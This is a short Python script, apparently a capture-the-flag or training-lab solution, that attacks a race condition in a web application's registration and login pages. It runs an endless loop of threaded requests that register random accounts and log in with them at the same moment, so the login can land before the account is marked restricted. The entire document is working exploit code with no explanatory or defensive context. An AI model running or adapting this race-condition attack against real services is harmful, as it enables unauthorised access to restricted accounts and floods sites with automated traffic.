#funziona con python3
import requests
import threading
import random
import string
import time

HOST = "http://aart.training.jinblack.it"
register_url = "%s/register.php" %HOST
login_url = "%s/login.php" %HOST


def random_string():
    n = 10
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=n))

def register(username, password):
    r = requests.post(register_url, data={'username' : username, 'password' : password})
    print(r.text)

def login(username, password):
    r = requests.post(login_url, data={'username' : username, 'password' : password})
    print(r.text)
    won = False if "This is a restricted account" in r.text else True 
    if won:
        print(r.text)
        return

if __name__ == '__main__':
    while True:
        u = random_string()
        p = random_string()
        x = threading.Thread(target=register, args=(u,p))
        y = threading.Thread(target=login, args=(u,p))
        x.start()
        y.start()
        x.join()
        y.join()
        time.sleep(0.3)